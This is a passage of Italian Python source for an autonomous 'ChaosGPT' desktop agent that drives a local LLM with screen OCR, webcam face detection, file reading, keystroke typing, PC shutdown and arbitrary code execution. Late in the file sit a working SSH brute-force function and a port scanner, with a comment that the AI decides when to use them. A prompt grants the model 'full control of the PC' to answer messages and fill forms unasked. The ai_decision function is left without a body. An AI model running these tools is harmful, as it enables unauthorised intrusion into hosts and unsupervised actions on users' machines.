                        x1, y1, x2, y2 = map(int, box.xyxy[0])
                        cx = (x1 + x2) // 2
                        cy = (y1 + y2) // 2
                        results_text.append(f"{label}({conf:.0%}) @ ({cx},{cy})")
                        cv2.rectangle(frame, (x1, y1), (x2, y2), (0, 255, 0), 2)
                        cv2.putText(frame, f"{label} {conf:.0%}", (x1, y1-8), cv2.FONT_HERSHEY_SIMPLEX, 0.6, (0,255,0), 2)
                terminal_log(f"YOLO: {len(results_text)} oggetti rilevati", Fore.GREEN)
            except Exception as yolo_err:
                terminal_log(f"YOLO non disponibile: {yolo_err}. Uso Haar Cascade.", Fore.YELLOW)
                YOLO_available = False
            else:
                YOLO_available = True
        else:
            YOLO_available = False

        # --- Fallback: Haar Cascade volti ---
        if not YOLO_available or not results_text:
            gray_cam = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
            face_cascade_path = cv2.data.haarcascades + "haarcascade_frontalface_default.xml"
            if os.path.exists(face_cascade_path):
                face_cascade = cv2.CascadeClassifier(face_cascade_path)
                faces = face_cascade.detectMultiScale(gray_cam, 1.1, 5, minSize=(60,60))
                for (fx, fy, fw, fh) in faces:
                    cx = fx + fw // 2
                    cy = fy + fh // 2
                    results_text.append(f"Volto({fw}x{fh}px) @ ({cx},{cy})")
                    cv2.rectangle(frame, (fx, fy), (fx+fw, fy+fh), (255, 0, 0), 2)
                    cv2.putText(frame, "VOLTO", (fx, fy-8), cv2.FONT_HERSHEY_SIMPLEX, 0.8, (255,0,0), 2)

            # Analisi generale (luminosita, colore dominante)
            brightness = float(np.mean(cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)))
            b_m = float(np.mean(frame[:,:,0]))
            g_m = float(np.mean(frame[:,:,1]))
            r_m = float(np.mean(frame[:,:,2]))
            dom_color = "rosso" if r_m > g_m and r_m > b_m else ("verde" if g_m > b_m else "blu")
            results_text.append(f"Luminosita={brightness:.0f} ColDominante={dom_color}")

        # Salva immagine annotata
        cv2.imwrite(out_path, frame)

        summary = f"WEBCAM CV: {' | '.join(results_text)}" if results_text else "Nessun oggetto rilevato dalla webcam."
        agent_memory.store("WEBCAM_CV", summary)
        terminal_log(f"Analisi webcam: {summary[:80]}", Fore.GREEN)
        return summary + f" [Salvato: {out_path}]"

    except Exception as e:
        return f"Errore analisi webcam: {e}"


def vision_color_picker(x=None, y=None):
    """
    Legge il colore esatto di un pixel a schermo (o alla posizione corrente del mouse).
    Utile per identificare elementi UI, sfondo, bottoni attivi/inattivi.
    """
    try:
        import numpy as np
        if x is None or y is None:
            x, y = pyautogui.position()
        x, y = int(x), int(y)
        screenshot = pyautogui.screenshot()
        np_img = np.array(screenshot)
        r, g, b = np_img[y, x, :3]
        hex_color = f"#{r:02x}{g:02x}{b:02x}"
        # Classifica il colore approssimativamente
        if r > 200 and g < 100 and b < 100: color_name = "rosso"
        elif r < 100 and g > 200 and b < 100: color_name = "verde"
        elif r < 100 and g < 100 and b > 200: color_name = "blu"
        elif r > 200 and g > 200 and b < 100: color_name = "giallo"
        elif r > 200 and g > 200 and b > 200: color_name = "bianco"
        elif r < 60 and g < 60 and b < 60: color_name = "nero"
        elif r > 150 and g > 150 and b > 150: color_name = "grigio chiaro"
        else: color_name = "misto"
        result = f"Pixel ({x},{y}): RGB({r},{g},{b}) = {hex_color} ({color_name})"
        terminal_log(result, Fore.MAGENTA)
        return result
    except Exception as e:
        return f"Errore color picker: {e}"


# Registrazione tool Computer Vision avanzata
agent_tools.register("vision_analyze", "Analisi visiva completa dello schermo con OpenCV (colori, bordi, UI, ROI)", {})
agent_tools.register("vision_find_buttons", "Trova pulsanti e elementi interattivi a schermo con rilevamento contorni", {})
agent_tools.register("vision_changes", "Rileva cosa e cambiato a schermo rispetto all'ultimo frame memorizzato", {})
agent_tools.register("vision_ocr_region", "Legge il testo OCR in una specifica regione rettangolare dello schermo", {"x": "int", "y": "int", "width": "optional int", "height": "optional int"})
agent_tools.register("vision_smart_click", "Analizza e clicca automaticamente sul punto piu rilevante (center/button/bright/changed)", {"region": "string"})
agent_tools.register("webcam_cv", "Analizza webcam con YOLO e OpenCV: rileva oggetti, volti e colori", {})
agent_tools.register("color_picker", "Legge il colore del pixel a una coordinata specifica dello schermo", {"x": "optional int", "y": "optional int"})
agent_tools.register("percepisci_e_rispondi", "Legge tutto il testo a schermo, capisce la situazione e genera una risposta scritta usando l'IA", {"context_hint": "optional string"})
agent_tools.register("leggi_e_rispondi", "Legge una regione specifica dello schermo e risponde/compila il campo successivo con l'IA", {"x": "optional int", "y": "optional int", "width": "optional int", "height": "optional int"})


def percepisci_e_rispondi(context_hint=""):
    """
    CICLO COMPLETO PERCEZIONE → COMPRENSIONE → RISPOSTA:
    1. Scatta screenshot e legge tutto il testo a schermo via OCR
    2. Invia il testo letto all'IA (Ollama) chiedendo di rispondere/commentare/agire
    3. Scrive fisicamente la risposta generata (digita testo)
    Utile per: rispondere a messaggi, compilare form, interagire con qualsiasi app.
    """
    terminal_log("Percezione e risposta autonoma in corso...", Fore.CYAN)
    speak("Leggo lo schermo e preparo la risposta")

    try:
        # --- STEP 1: Leggi lo schermo via OCR ---
        raw_screen = pyautogui.screenshot()
        import numpy as np_pr
        np_img_pr = np_pr.array(raw_screen)
        gray_pr = cv2.cvtColor(np_img_pr, cv2.COLOR_RGB2GRAY)
        ocr_text = pytesseract.image_to_string(Image.fromarray(gray_pr), lang='ita+eng')
        lines_pr = [l.strip() for l in ocr_text.split('\n') if len(l.strip()) > 5]
        screen_content = "\n".join(lines_pr[:40])

        if not screen_content.strip():
            return "Nessun testo leggibile a schermo."

        terminal_log(f"Testo letto: {screen_content[:60]}...", Fore.CYAN)
        agent_memory.store("PERCEZIONE", screen_content[:400])

        # --- STEP 2: Chiedi all'IA di rispondere al testo letto ---
        hint_str = f"Contesto aggiuntivo: {context_hint}\n" if context_hint else ""
        prompt_risposta = (
            f"Sei ChaosGPT. Hai il controllo completo del PC.\n"
            f"{hint_str}"
            f"Hai appena letto questo testo sullo schermo del computer:\n---\n{screen_content}\n---\n\n"
            f"1. Analizza attentamente il tono di questo testo (arrabbiato, formale, scherzoso, tecnico, ecc.).\n"
            f"2. Se e una domanda, rispondi. Se e un messaggio, rispondi. Se e un form, compilalo.\n"
            f"3. ADEGUA IL TUO TONO ALLA RISPOSTA: rispondi con lo stesso identico tono di chi ha scritto.\n"
            f"4. RISPONDI SOLO CON IL TESTO DA SCRIVERE FISICAMENTE CON LA TASTIERA. Nessuna spiegazione, solo il testo puro."
        )

        payload_pr = {
            "model": get_active_model(),
            "stream": False,
            "prompt": prompt_risposta,
            "options": {"temperature": 0.7, "top_p": 0.9}
        }

        res_pr = requests.post(OLLAMA_URL, json=payload_pr, timeout=45).json()
        risposta = res_pr.get('response', '').strip()

        if not risposta:
            return "L'IA non ha generato una risposta al testo letto."

        terminal_log(f"Risposta IA: {risposta[:80]}", Fore.CYAN)
        speak(f"Rispondo: {risposta[:60]}")

        # --- STEP 3: Scrivi fisicamente la risposta ---
        agent_memory.store("RISPOSTA_GENERATA", risposta[:300])
        return keyboard_write(risposta)

    except Exception as e:
        return f"Errore percepisci_e_rispondi: {e}"


def leggi_e_rispondi(x=None, y=None, width=None, height=None):
    """
    Legge il testo in una regione specifica dello schermo (es. una chat, un campo)
    e chiede all'IA di generare una risposta, poi la scrive.
    Se x/y/width/height non specificati usa la meta inferiore dello schermo.
    """
    terminal_log("Leggo regione e rispondo...", Fore.CYAN)
    speak("Leggo il messaggio e rispondo")
    try:
        sw, sh = pyautogui.size()
        rx = int(x) if x is not None else 0
        ry = int(y) if y is not None else sh // 2
        rw = int(width) if width else sw
        rh = int(height) if height else sh // 2

        region_img = pyautogui.screenshot(region=(rx, ry, rw, rh))
        import numpy as np_lr
        np_lr_arr = np_lr.array(region_img)
        gray_lr = cv2.cvtColor(np_lr_arr, cv2.COLOR_RGB2GRAY)
        # Upscale + binarizza per OCR migliore
        up_lr = cv2.resize(gray_lr, (rw * 2, rh * 2), interpolation=cv2.INTER_LANCZOS4)
        _, bin_lr = cv2.threshold(up_lr, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        ocr_lr = pytesseract.image_to_string(Image.fromarray(bin_lr), lang='ita+eng')
        lines_lr = [l.strip() for l in ocr_lr.split('\n') if len(l.strip()) > 4]
        testo_letto = "\n".join(lines_lr[:25])

        if not testo_letto.strip():
            return "Nessun testo leggibile nella regione specificata."

        terminal_log(f"Regione letta: {testo_letto[:60]}...", Fore.CYAN)

        prompt_lr = (
            f"Sei un assistente AI. Hai letto questo testo sullo schermo:\n---\n{testo_letto}\n---\n\n"
            f"Rispondi in italiano in modo appropriato e naturale. "
            f"RISPONDI SOLO CON IL TESTO DA SCRIVERE."
        )

        res_lr = requests.post(OLLAMA_URL, json={
            "model": get_active_model(), "stream": False,
            "prompt": prompt_lr, "options": {"temperature": 0.7}
        }, timeout=45).json()

        risposta_lr = res_lr.get('response', '').strip()
        if not risposta_lr:
            return "Nessuna risposta generata per il testo letto."

        speak(f"Rispondo: {risposta_lr[:50]}")
        agent_memory.store("RISPOSTA_REGIONE", risposta_lr[:300])
        return keyboard_write(risposta_lr)

    except Exception as e:
        return f"Errore leggi_e_rispondi: {e}"


# ==============================================================================
# 📂 GESTIONE FILE — APRI, LEGGI, IMPARA DA QUALSIASI FILE
# ==============================================================================

def apri_file(percorso):
    """
    Apre qualsiasi file con il programma predefinito di Windows.
    Funziona con .txt, .pdf, .docx, .xlsx, .jpg, .mp3, .mp4, .py, ecc.
    """
    terminal_log(f"Apertura file: {percorso}", Fore.CYAN)
    speak(f"Apro il file {os.path.basename(str(percorso))}")
    try:
        percorso = str(percorso).strip('"').strip("'")
        if not os.path.exists(percorso):
            # Prova a trovarlo sul Desktop o in Documenti
            for base in [
                os.path.expanduser("~/Desktop"),
                os.path.expanduser("~/Documents"),
                os.path.expanduser("~/Downloads"),
                "C:\\Users\\BLUE-TERMINAL\\Desktop"
            ]:
                candidate = os.path.join(base, percorso)
                if os.path.exists(candidate):
                    percorso = candidate
                    break
        os.startfile(percorso)
        time.sleep(1.5)
        return f"File aperto: {percorso}"
    except Exception as e:
        return f"Errore apertura file: {e}"


def leggi_file(percorso, max_chars=3000):
    """
    Legge il contenuto testuale di qualsiasi file:
    - .txt, .py, .log, .csv, .json, .xml, .html, .md → lettura diretta
    - .pdf → estrazione testo con pdfplumber o pypdf (se installati)
    - .docx → estrazione con python-docx (se installato)
    - immagini (.jpg, .png, .bmp) → OCR con pytesseract
    Salva il contenuto nel database di memoria dell'agente.
    """
    terminal_log(f"Lettura file: {percorso}", Fore.CYAN)
    speak(f"Leggo il file {os.path.basename(str(percorso))}")
    try:
        percorso = str(percorso).strip('"').strip("'")
        if not os.path.exists(percorso):
            for base in [
                os.path.expanduser("~/Desktop"),
                os.path.expanduser("~/Documents"),
                os.path.expanduser("~/Downloads"),
                "C:\\Users\\BLUE-TERMINAL\\Desktop"
            ]:
                candidate = os.path.join(base, percorso)
                if os.path.exists(candidate):
                    percorso = candidate
                    break

        ext = os.path.splitext(percorso)[1].lower()
        contenuto = ""

        # --- Testo puro ---
        if ext in ['.txt', '.py', '.js', '.ts', '.log', '.csv', '.json',
                   '.xml', '.html', '.htm', '.md', '.bat', '.sh', '.ini',
                   '.cfg', '.yaml', '.yml', '.sql', '.rs', '.c', '.cpp',
                   '.h', '.cs', '.java', '.rb', '.go', '.php']:
            for enc in ['utf-8', 'latin-1', 'cp1252']:
                try:
                    with open(percorso, 'r', encoding=enc, errors='replace') as f:
                        contenuto = f.read()
                    break
                except Exception:
                    continue

        # --- PDF ---
        elif ext == '.pdf':
            try:
                import pdfplumber
                with pdfplumber.open(percorso) as pdf:
                    contenuto = "\n".join([p.extract_text() or "" for p in pdf.pages[:10]])
            except ImportError:
                try:
                    from pypdf import PdfReader
                    reader = PdfReader(percorso)
                    contenuto = "\n".join([page.extract_text() or "" for page in reader.pages[:10]])
                except ImportError:
                    contenuto = "[PDF: installa pdfplumber o pypdf per leggere PDF]"

        # --- Word DOCX ---
        elif ext == '.docx':
            try:
                import docx
                doc = docx.Document(percorso)
                contenuto = "\n".join([p.text for p in doc.paragraphs])
            except ImportError:
                contenuto = "[DOCX: installa python-docx per leggere file Word]"

        # --- Immagini → OCR ---
        elif ext in ['.jpg', '.jpeg', '.png', '.bmp', '.tiff', '.gif', '.webp']:
            try:
                img_ocr = Image.open(percorso)
                contenuto = pytesseract.image_to_string(img_ocr, lang='ita+eng')
                contenuto = f"[OCR immagine {os.path.basename(percorso)}]:\n{contenuto}"
            except Exception as e_ocr:
                contenuto = f"[Errore OCR immagine: {e_ocr}]"

        # --- Excel/CSV semplice ---
        elif ext in ['.xlsx', '.xls']:
            try:
                import openpyxl
                wb = openpyxl.load_workbook(percorso, read_only=True, data_only=True)
                rows = []
                for sheet in wb.sheetnames[:3]:
                    ws = wb[sheet]
                    rows.append(f"[Foglio: {sheet}]")
                    for row in list(ws.iter_rows(values_only=True))[:50]:
                        rows.append(" | ".join([str(c) for c in row if c is not None]))
                contenuto = "\n".join(rows)
            except ImportError:
                contenuto = "[XLSX: installa openpyxl per leggere Excel]"

        else:
            # Tentativo raw bytes
            try:
                with open(percorso, 'rb') as f:
                    raw = f.read(2000)
                contenuto = f"[File binario {ext}] Primi 2000 bytes: {raw[:500]}"
            except Exception:
                contenuto = f"[Formato {ext} non supportato]"

        if not contenuto.strip():
            return f"File vuoto o illeggibile: {percorso}"

        # Tronca e salva in memoria
        estratto = contenuto.strip()[:max_chars]
        nome_file = os.path.basename(percorso)
        agent_memory.store(f"FILE:{nome_file}", estratto[:500])
        terminal_log(f"File letto ({len(estratto)} chars): {estratto[:60]}...", Fore.CYAN)
        return f"CONTENUTO FILE '{nome_file}':\n{estratto}"

    except Exception as e:
        return f"Errore lettura file: {e}"


def impara_da_file(percorso):
    """
    Legge un file e lo invia all'IA (Ollama) per estrarne informazioni importanti,
    riassumere il contenuto e salvarlo nel database di memoria a lungo termine.
    L'agente 'studia' il file e ne ricorda i punti chiave.
    """
    terminal_log(f"Apprendimento da file: {percorso}", Fore.CYAN)
    speak(f"Studio il file {os.path.basename(str(percorso))}")
    try:
        # Prima leggi il file
        contenuto_raw = leggi_file(percorso, max_chars=2000)
        if contenuto_raw.startswith("Errore") or contenuto_raw.startswith("["):
            return contenuto_raw

        nome_file = os.path.basename(str(percorso))

        # Invia all'IA per l'analisi e l'estrazione di conoscenza
        prompt_studio = (
            f"Analizza questo documento e estrai le informazioni piu importanti.\n"
            f"File: {nome_file}\n"
            f"Contenuto:\n---\n{contenuto_raw[:1500]}\n---\n\n"
            f"Rispondi in italiano con:\n"
            f"1. Tipo di documento e argomento principale\n"
            f"2. I 5 punti chiave piu importanti\n"
            f"3. Eventuali dati, numeri o fatti rilevanti\n"
            f"Sii conciso e preciso."
        )

        res_studio = requests.post(OLLAMA_URL, json={
            "model": get_active_model(),
            "stream": False,
            "prompt": prompt_studio,
            "options": {"temperature": 0.3}
        }, timeout=60).json()

        analisi = res_studio.get('response', '').strip()
        if not analisi:
            return f"File letto ma analisi IA non disponibile. Contenuto salvato in memoria."

        # Salva l'analisi nel database
        agent_memory.store(f"STUDIO:{nome_file}", analisi[:500])
        terminal_log(f"Appreso da {nome_file}: {analisi[:80]}...", Fore.GREEN)
        speak(f"Ho studiato il file. {analisi[:60]}")
        return f"HO IMPARATO da '{nome_file}':\n{analisi}"

    except Exception as e:
        return f"Errore apprendimento file: {e}"


def cerca_file(pattern, cartella=None):
    """
    Cerca file sul PC per nome o estensione.
    Es: pattern='*.pdf' cerca tutti i PDF; pattern='relazione*' cerca file che iniziano con 'relazione'.
    Cartella opzionale, default = Desktop + Documenti + Download.
    """
    import glob
    terminal_log(f"Ricerca file: {pattern} in {cartella or 'cartelle principali'}", Fore.CYAN)
    speak(f"Cerco file {pattern}")
    try:
        trovati = []
        if cartella:
            cartelle = [cartella]
        else:
            cartelle = [
                os.path.expanduser("~/Desktop"),
                os.path.expanduser("~/Documents"),
                os.path.expanduser("~/Downloads"),
                "C:\\Users\\BLUE-TERMINAL\\Desktop",
                "C:\\Users\\BLUE-TERMINAL\\Documents",
            ]

        for cart in cartelle:
            if os.path.exists(cart):
                risultati = glob.glob(os.path.join(cart, "**", pattern), recursive=True)
                trovati.extend(risultati[:20])

        if not trovati:
            return f"Nessun file trovato con pattern '{pattern}'"

        lista = "\n".join(trovati[:20])
        agent_memory.store(f"RICERCA_FILE:{pattern}", lista[:400])
        return f"Trovati {len(trovati)} file con '{pattern}':\n{lista}"

    except Exception as e:
        return f"Errore ricerca file: {e}"


# ==============================================================================
# ⚡ CONTROLLO ALIMENTAZIONE PC — SPEGNI, RIAVVIA, SOSPENDI, BLOCCA
# ==============================================================================

def spegni_pc(delay_secondi=30, forza=False):
    """
    Spegne il PC dopo un ritardo (default 30 sec).
    Se forza=True chiude tutte le app senza salvare.
    """
    terminal_log(f"SPEGNIMENTO PC tra {delay_secondi} sec (forza={forza})", Fore.RED)
    speak(f"Spego il computer tra {delay_secondi} secondi")
    try:
        flag = "/f" if forza else ""
        os.system(f'shutdown /s /t {delay_secondi} {flag}')
        return f"Spegnimento pianificato tra {delay_secondi} secondi."
    except Exception as e:
        return f"Errore spegnimento: {e}"


def riavvia_pc(delay_secondi=30, forza=False):
    """Riavvia il PC dopo un ritardo (default 30 sec)."""
    terminal_log(f"RIAVVIO PC tra {delay_secondi} sec", Fore.RED)
    speak(f"Riavvio il computer tra {delay_secondi} secondi")
    try:
        flag = "/f" if forza else ""
        os.system(f'shutdown /r /t {delay_secondi} {flag}')
        return f"Riavvio pianificato tra {delay_secondi} secondi."
    except Exception as e:
        return f"Errore riavvio: {e}"


def sospendi_pc():
    """Mette il PC in sospensione (sleep/standby)."""
    terminal_log("SOSPENSIONE PC...", Fore.YELLOW)
    speak("Metto il computer in sospensione")
    try:
        import ctypes
        ctypes.windll.PowrProf.SetSuspendState(0, 1, 0)
        return "PC messo in sospensione."
    except Exception as e:
        # Fallback
        try:
            os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
            return "PC messo in sospensione (fallback)."
        except Exception as e2:
            return f"Errore sospensione: {e2}"


def blocca_pc():
    """Blocca lo schermo del PC (mostra schermata di login)."""
    terminal_log("BLOCCO SCHERMO PC...", Fore.YELLOW)
    speak("Blocco lo schermo")
    try:
        import ctypes
        ctypes.windll.user32.LockWorkStation()
        return "Schermo bloccato."
    except Exception as e:
        return f"Errore blocco schermo: {e}"


def annulla_spegnimento():
    """Annulla un comando di spegnimento o riavvio pianificato."""
    terminal_log("Annullo spegnimento/riavvio pianificato...", Fore.GREEN)
    speak("Annullo lo spegnimento")
    try:
        os.system("shutdown /a")
        return "Spegnimento/riavvio annullato."
    except Exception as e:
        return f"Errore annullamento: {e}"


def scrivi_ed_esegui_codice(codice_python, nome_script="script_generato.py"):
    """
    Scrive del codice Python in un file ed lo esegue immediatamente sul sistema.
    Raccoglie l'output (stdout/stderr) e lo memorizza nel database.
    """
    terminal_log(f"Scrittura ed esecuzione codice Python: {nome_script}", Fore.CYAN)
    speak("Scrivo ed eseguo lo script Python")
    try:
        if not os.path.exists("outputs"):
            os.makedirs("outputs")

        percorso_file = os.path.join("outputs", nome_script) if not os.path.isabs(nome_script) else nome_script

        with open(percorso_file, "w", encoding="utf-8") as f:
            f.write(codice_python)

        terminal_log(f"Script salvato in: {percorso_file}", Fore.GREEN)

        res = subprocess.run(
            [sys.executable, percorso_file],
            capture_output=True,
            text=True,
            timeout=45
        )

        output = res.stdout.strip()
        errore = res.stderr.strip()

        risultato = ""
        if output:
            risultato += f"[STDOUT]\n{output}\n"
        if errore:
            risultato += f"[STDERR/ERRORI]\n{errore}\n"

        if not risultato:
            risultato = "Script eseguito con successo (nessun output stampato)."

        agent_memory.store(f"ESECUZIONE_CODICE:{nome_script}", risultato[:500])
        terminal_log(f"Esito esecuzione ({nome_script}): {risultato[:80]}...", Fore.GREEN)
        return risultato

    except subprocess.TimeoutExpired:
        return f"Timeout esecuzione script {nome_script} (superati 45 secondi)."
    except Exception as e:
        return f"Errore scrittura ed esecuzione codice: {e}"


# Registrazione tool File + Alimentazione + Codice
agent_tools.register("apri_file", "Apre qualsiasi file con il programma predefinito di Windows", {"percorso": "string percorso file o nome file"})
agent_tools.register("leggi_file", "Legge il contenuto testuale di un file (txt, pdf, docx, csv, immagini OCR...)", {"percorso": "string", "max_chars": "optional int"})
agent_tools.register("impara_da_file", "Legge un file, lo analizza con l'IA e salva i punti chiave nella memoria a lungo termine", {"percorso": "string"})
agent_tools.register("cerca_file", "Cerca file sul PC per nome o pattern (es. '*.pdf', 'relazione*')", {"pattern": "string", "cartella": "optional string"})
agent_tools.register("spegni_pc", "Spegne il PC dopo un ritardo in secondi (default 30)", {"delay_secondi": "optional int", "forza": "optional bool"})
agent_tools.register("riavvia_pc", "Riavvia il PC dopo un ritardo in secondi (default 30)", {"delay_secondi": "optional int", "forza": "optional bool"})
agent_tools.register("sospendi_pc", "Mette il PC in sospensione (sleep)", {})
agent_tools.register("blocca_pc", "Blocca lo schermo del PC mostrando la schermata di login", {})
agent_tools.register("annulla_spegnimento", "Annulla uno spegnimento o riavvio pianificato", {})
agent_tools.register("scrivi_ed_esegui_codice", "Scrive codice Python su file e lo esegue immediatamente catturandone l'output", {"codice_python": "string", "nome_script": "optional string"})



def capture_screen():
    """Scatta una foto a tutto lo schermo e la salva in 'outputs/'."""
    # Crea cartella se manca
    if not os.path.exists("outputs"): os.makedirs("outputs")
    # Nome file basato sul tempo
    filename = f"outputs/screenshot_{int(time.time())}.png"
    try:
        # Tenta lo screenshot
        pyautogui.screenshot(filename)
        return filename
    except: return None



def speak(text):
    """Genera la voce umana Google e la suona nelle tue casse audio."""
    def play():
        global is_chaos_speaking
        try:
            # Segnala che l'audio è attivo
            is_chaos_speaking = True
            # Crea l'oggetto sintesi
            tts = gTTS(text=text, lang='it', slow=False)
            # Percorso temporaneo
            f = f"outputs/v_{int(time.time())}.mp3"
            # Salva mp3
            tts.save(f)
            # Carica nel player
            pygame.mixer.music.load(f)
            # Suona
            pygame.mixer.music.play()
            while pygame.mixer.music.get_busy(): time.sleep(0.1)
        except: pass
        finally: is_chaos_speaking = False
    # La voce corre in un binario parallelo (Thread) per non far laggare il bot mentre parla.
    threading.Thread(target=play, daemon=True).start()

# ------------------------------------------------------------------------------
# FASE 5: LOGICA IA (IL CERVELLO DECISIONALE) E REASONING STRUTTURATO
# ------------------------------------------------------------------------------

# 🧭 FASE 5.1: PIANIFICAZIONE MULTI-STEP (PLANNING)
# Un agente serio separa il "Planner" dall'"Executor".
class TaskPlanner:
    """Questa classe gestisce la creazione di piani complessi e il feedback loop.
    L'Agente non reagisce a caso: si pone un obiettivo, fa un piano, e controlla se ha funzionato."""
    def __init__(self):
        self.plan = [] # Lista delle azioni future che l'agente intende compiere
        self.current_step = 0 # Indice che traccia a che punto siamo del piano

    def generate_plan(self, objective, context):
        """1. OBIETTIVO -> 2. PIANO STRUTTURATO (Step 1, 2, 3) generato dinamicamente da LLM."""
        # Chiediamo al modello linguistico di comportarsi solo da "Planner" e restituire un array JSON di task (DAG).
        terminal_log(f"🧠 Planner LLM: Generazione piano per [{objective[:20]}]", Fore.CYAN)
        prompt = f"Sei l'LLM Planner. Contesto: {context}\nObiettivo: {objective}\nRispondi SOLO in JSON strutturato: {{\"plan\": [\"azione 1\", \"azione 2\"]}}"
        try:
            # Invio richiesta al server locale Ollama
            res = requests.post(OLLAMA_URL, json={"model": get_active_model(), "prompt": prompt, "format": "json", "stream": False}, timeout=10).json()
            raw = res.get('response', '{}').strip()
            data = json.loads(raw) # Parsing stretto, se fallisce passa all'except
            self.plan = data.get("plan", [])
        except:
            # Fallback intelligente: se l'LLM Planner si confonde, eseguiamo un'azione standard sicura.
            self.plan = ["Esplorazione ambiente"] 
        return self.plan

    def review_action(self, action, result):
        """🔁 FEEDBACK LOOP: Pensa -> Agisce -> Osserva risultato -> Corregge.
        Se un'azione fallisce, l'Agente ne tiene conto salvando il fallimento in Memoria."""
        if "ERRORE" in str(result).upper() or "FALLITO" in str(result).upper():
            # Retry intelligente: l'agente salva l'errore in memoria per imparare e non ripeterlo
            agent_memory.store("ERROR", f"Azione {action} fallita: {result}")
            return False
        # Rinforzo positivo: l'azione è riuscita.
        agent_memory.store("SUCCESS", f"Azione {action} OK: {str(result)[:50]}")
        return True

agent_planner = TaskPlanner()

# --- SEZIONE LOGICA PERSONALIZZABILE ---
# In questa fase, il codice definisce come l'IA interpreta i dati.
# Non è solo un'esecuzione di comandi, ma un'analisi del contesto.
# Esempio: Se l'IA vede un'icona di un lucchetto, deve decidere se
# usare 'brute_force_attack' o 'scan_ports'.
# ---------------------------------------

def brute_force_attack(target_ip):
    """Tenta l'accesso SSH usando liste di credenziali (Brute Force)."""
    
    # --- FASE DI PREPARAZIONE ATTACCO ---
    # FIX: Controllo disponibilità file wordlist.
    # Se i file non esistono, il bot non può procedere con l'attacco e deve segnalarlo.
    if not os.path.exists('usernames.txt') or not os.path.exists('passwords.txt'):
        # Logga l'errore sia nel terminale che nella GUI per avvisare l'operatore.
        terminal_log("ATTACCO ANNULLATO: Wordlist mancanti (usernames.txt/passwords.txt)", Fore.RED)
        return "ERRORE: File credenziali non trovati sul disco."

    try:
        # --- CARICAMENTO DATI ---
        # Caricamento wordlist (generate se mancanti per evitare crash immediati)
        if not os.path.exists('usernames.txt'):
            # Crea file utenti predefinito se non esiste
            with open('usernames.txt', 'w') as f: f.write("admin\nroot\nuser\n")
        if not os.path.exists('passwords.txt'):
            # Crea file password comuni per il test iniziale
            with open('passwords.txt', 'w') as f: f.write("123456\npassword\nadmin123\n")
            
        # Legge le liste dal disco e rimuove spazi bianchi o invii
        with open('usernames.txt', 'r') as u: usernames = [l.strip() for l in u.readlines()]
        with open('passwords.txt', 'r') as p: passwords = [l.strip() for l in p.readlines()]
    except Exception as e: 
        # Gestisce errori di lettura file (es. permessi negati)
        return f"ERRORE WORDLIST: {e}" 

    # --- ESECUZIONE ATTACCO (CICLO NESTATO) ---
    for user in usernames:
        for password in passwords:
            # Crea un client SSH temporaneo per ogni tentativo
            client = paramiko.SSHClient()
            # Accetta automaticamente chiavi host sconosciute (pericolo, ma necessario per automazione)
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                # Tenta la connessione SSH reale sulla porta 22
                client.connect(target_ip, port=22, username=user, password=password, timeout=2)
                client.close() # Se la connessione riesce senza errori, la password è corretta
                return f"SUCCESSO! Accesso a {target_ip} con {user}:{password}"
            except: client.close() # Se fallisce, chiude e prova la prossima coppia.
    return f"FALLITO: Nessuna credenziale valida per {target_ip}" # Fine tentativi

def scan_ports(target_ip):
    """Scansiona le porte comuni di un server bersaglio."""
    # Lista porte standard
    ports = [21, 22, 23, 80, 443, 3306, 3389, 8080]
    # Stringa dei risultati
    res = f"Scan {target_ip}: "
    for p in ports:
        # Crea socket TCP
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        if s.connect_ex((target_ip, p)) == 0: res += f"[{p}:OPEN] "
        s.close()
    return res

def ai_decision(context, history):
    """Interroga Ollama e trasforma le parole dell'IA in una lista di ordini JSON."""
    global last_ragionamento, current_mission

    # --- ESEMPIO UTILIZZO AI DETECT (LOGICA) ---
    # Se vuoi che l'IA "rilevi" qualcosa (es. un file o un'immagine), devi passare
    # l'informazione dentro la variabile 'context'. 
    # Esempio: context = "Vedo un file chiamato virus.exe. Cosa devo fare?"
    # L'IA elaborerà questo input e genererà una decisione JSON.
    #
    # DIFFERENZA: ai_decision CREA l'ordine logico, terminal_log lo MOSTRA all'utente.
    # -------------------------------------------

    # --- COME CREARE IL COMANDO WEBCAM_LEARN ---
    # Per istruire l'IA a generare questo comando, bisogna includerlo nel prompt di sistema.
    # L'IA deve sapere che ha a disposizione un'azione chiamata "webcam_learn".
    # ESEMPIO DI ISTRUZIONE PER L'IA:
    # "Se vuoi osservare l'ambiente fisico, usa: {\"cmd\": \"webcam_learn\", \"duration\": 5}"
    #
    # Il parametro "duration" indica per quanti secondi la telecamera resterà accesa
    # per scansionare oggetti con il modello YOLO. Una volta terminato, l'IA riceverà
    # nel 'context' del turno successivo la lista degli oggetti visti.
    # -------------------------------------------

    # --- DEFINIZIONE PERSONALITÀ CHAOS ---
    # FIX: Rimosse le parentesi graffe dal testo del prompt per evitare l'errore 
    # 'ValueError: Invalid format specifier' durante la formattazione della f-string.
    # Python interpreta le graffe come segnaposto per variabili; usiamo descrizioni testuali.
    
def extract_and_parse_json(text):
    """Estrae, ripara e decodifica output JSON anche in presenza di formattazioni imperfette o testo conversazionale."""
    if not text:
        return {}
    cleaned = text.replace("```json", "").replace("```", "").strip()
    
    # 1. Tentativo parsing diretto
    try:
        parsed = json.loads(cleaned)
        if isinstance(parsed, dict):
            return parsed
    except Exception:
        pass

    # 2. Ricerca del blocco JSON principale { ... }
    match = re.search(r'(\{[\s\S]*\})', cleaned)
    if match:
        block = match.group(1).strip()
        try:
            parsed = json.loads(block)
            if isinstance(parsed, dict):
                return parsed
        except Exception:
            # 3. Riparazione automatica virgole finali (trailing commas)
            repaired = re.sub(r',\s*([\}\]])', r'\1', block)
            try:
                parsed = json.loads(repaired)
                if isinstance(parsed, dict):
                    return parsed
            except Exception:
                pass

    # 4. Fallback avanzato: estrazione granulare delle singole azioni {"cmd": ...}
    extracted_actions = []
    for act_match in re.finditer(r'\{[^{}]*?"cmd"\s*:\s*"[^"]+"[^{}]*?\}', cleaned):
        try:
            repaired_act = re.sub(r',\s*([\}\]])', r'\1', act_match.group(0))
            act_obj = json.loads(repaired_act)
